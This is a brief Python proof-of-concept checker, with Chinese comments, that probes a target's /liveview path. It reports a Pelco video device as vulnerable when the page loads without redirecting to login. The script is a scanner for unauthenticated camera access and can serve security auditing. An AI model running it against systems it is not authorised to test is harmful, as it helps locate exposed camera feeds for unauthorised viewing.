# coding:utf-8
import re
import requests as req
def verify(target):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0",
    }
    action = "/liveview" #漏洞所在的目录
    target = target.rstrip("/")
    verfy_url = target + action#有时候路由URL会出现//liveview访问不到资源404，所以要确保访问到http://xxxx/liveview
    pattern = re.compile('Copyright.+PELCO.+<a href="http://www\\.pelco\\.com')#访问成功的网站
    resp = req.get(verfy_url, headers=headers, timeout=30, verify=False, allow_redirects=False)
    flag = pattern.findall(resp.text)
    if resp.status_code == 200 and flag and 'window.location.replace("/auth/login");' not in resp.text:
        print (target + "，存在漏洞")
        return True
    return False
if __name__ == '__main__':
    verify("http://111.111.111.111/")